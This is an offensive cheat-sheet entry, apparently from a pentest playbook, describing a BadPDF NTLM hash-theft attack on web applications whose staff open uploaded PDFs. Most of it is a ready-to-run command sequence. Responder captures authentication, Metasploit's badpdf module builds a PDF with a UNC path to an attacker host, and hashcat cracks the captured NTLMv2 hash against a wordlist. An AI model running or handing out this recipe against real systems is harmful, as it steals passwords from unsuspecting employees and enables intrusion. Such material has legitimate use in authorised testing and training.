# BadPDF NTLM Hash Capture

### BadPDF via Metasploit + Responder (NTLM Hash Theft) [added: 2026-04]
- **Tags:** #BadPDF #NTLM #Responder #HashCapture #SMB #PhishingUpload #FileUpload
- **Trigger:** Web application accepts PDF uploads; message or hint that staff review uploaded files; file upload form exists
- **Prereq:** File upload accepting PDFs; Responder listening on attacker interface; Metasploit auxiliary/fileformat/badpdf
- **Yields:** NTLMv2 hash of the user opening the PDF → crack with hashcat -m 5600 → plaintext password
- **Opsec:** Med
- **Context:** BadPDF embeds a UNC path pointing to attacker's SMB server. When the PDF is opened by a Windows user, Windows automatically authenticates via NTLM, leaking the NTLMv2 hash. Works when staff review uploaded applications/documents.
- **Payload/Method:**
  ```bash
  # Start Responder to capture inbound NTLM auth
  sudo responder -I tun0

  # Generate the malicious PDF with Metasploit
  msfconsole -q
  use auxiliary/fileformat/badpdf
  set FILENAME application.pdf
  set LHOST <ATTACKER_IP>
  run
  # Output: ~/.msf4/local/application.pdf

  # Upload PDF via the web form, then wait

  # Crack the captured hash
  cp /usr/share/responder/logs/SMB-NTLMv2-SSP-<TARGET_IP>.txt hash.txt
  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
  ```
